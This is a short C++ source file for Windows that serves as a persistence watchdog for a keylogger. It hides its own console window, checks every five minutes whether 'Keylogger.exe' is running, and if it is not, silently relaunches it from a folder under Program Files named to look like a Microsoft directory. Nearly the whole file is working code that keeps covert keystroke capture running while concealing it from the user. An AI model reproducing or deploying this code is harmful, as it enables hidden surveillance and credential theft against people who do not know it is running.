/*
* C++ Check Runner Proccess with Name
* Author: walid Abbassi [https://github.com/walidAbbassi]
* 2019
*
*/

//#include "pch.h"		//Precompiled Headers removed for this small example
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <chrono>
#include <thread>

#define _L(x)  __L(x)
#define __L(x) L ## x

#define KeyloggerName		_L("Keylogger.exe")
#define FolderPath			_L("\\Microsoft\\Keylogger\\")
#define ProgramFiles_x86	_L("ProgramFiles(x86)")
#define ProgramFiles		_L("ProgramFiles")
// full path exe = (ProgramFiles / ProgramFiles_x86) + FolderPath + KeyloggerName

/*
*	window handler used to Hide output console window
*	@name	: hide
*	@param	: no param.
*	@return : void
*/
void hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}


/*
*	Find proccess Id with name of process
*	@name	: FindProcessId
*	@param : proccess name (wstring)
*	@return : proccess ID (unsigned long)
*/
DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}
int main()
{
	hide();
	std::wstring KeyloggerName_ = KeyloggerName;
	std::wstring Folder_dir = FolderPath;
	std::wstring appdata_dir = _wgetenv(ProgramFiles_x86);

	if (appdata_dir.empty())
	{
		appdata_dir = _wgetenv(ProgramFiles);
	}
	// you can changed the path of installed keylloger 
	std::wstring  exe_path_full = appdata_dir + Folder_dir + KeyloggerName_;
	//std::wstring  exe_path_full = L".\\"+ KeyloggerName_;			//if you want run from project

	bool bAnyKeyloggerIsRun = false;
	while (true)
	{
		std::string result;
		// " sleep 5 minutes for every check "
		std::this_thread::sleep_for(std::chrono::minutes(5));
		if (!FindProcessId(KeyloggerName_))
		{
			//" Keylogger Process not Runnig ";
			bAnyKeyloggerIsRun = true;
			// " Start Keylogger.exe "
			ShellExecute(NULL, NULL, exe_path_full.c_str(), NULL, NULL, SW_HIDE);
		}
	}

	return 0;
}


